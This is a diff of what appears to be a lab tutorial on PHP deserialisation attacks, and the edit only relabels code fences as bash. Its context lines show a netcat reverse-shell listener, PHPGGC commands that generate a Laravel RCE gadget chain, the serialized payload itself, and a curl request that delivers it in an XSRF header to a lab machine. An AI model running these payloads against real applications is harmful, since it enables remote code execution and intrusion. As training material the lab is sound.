@@ -527,7 +527,7 @@ echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
  
 
     Terminal  
-```Terminal 
+```bash
 thm@ubuntu$ nc -nvlp 4444
 Listening on [0.0.0.0] (family 0, port 4444)
 Connection from ATTACK_IP 35838 received!
@@ -571,7 +571,7 @@ You can download PHPGGC from its [GitHub repository](https://github.com/ambionic
 To list all available gadget chains, you can use the `-l` option with PHPGGC, which will show the Name, Version, Type and Vector for launching a specific attack. Additionally, you can filter gadget chains based on their capabilities, such as those targeting particular PHP frameworks or achieving specific exploit techniques, using the `-l` option followed by a filter keyword (Drupal, Laravel, etc.). This allows you to select the appropriate gadget chain for your exploitation scenario, as shown below:
 
     Terminal  
-```Terminal 
+```bash
 thm@machine$ php phpggc -l
 
 Gadget Chains
@@ -610,7 +610,7 @@ Now we will go into detailed step-by-step exploitation:
 - For the second step, we need to identify the payload we can use.
 
     Terminal  
-```Terminal 
+```bash
 thm@machine$ php phpggc -l Laravel
 
 Gadget Chains
@@ -626,7 +626,7 @@ Laravel/RCE4          5.5.39            rce              __destruct
  Moving forward, we can generate the payload using various gadgets. Each gadget has its relevancy and utilises different classes during the deserialisation process. We will use RCE3 in this example and can generate the payload by typing the command `php phpggc -b Laravel/RCE3 system whoami` for a base-64 encoded payload. A non-encoded payload is shown below:
 
     Terminal  
-```Terminal 
+```bash
 thm@machine$ php phpggc Laravel/RCE3 system whoami O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"*events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"*app";s:6:"whoami";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"assert";}}}
 ```
 
@@ -650,7 +650,7 @@ When pen-testing web frameworks like Yii, CakePHP, and Laravel, it's essential t
 Now that we have the encrypted token, we can make a simple POST request using the CSRF token as shown below to execute the command. The payload result will appear at the start of the `cURL` response.
 
     Terminal  
-```Terminal 
+```bash
 thm@machine$curl MACHINE_IP:8089 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ=='| head -n 2
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
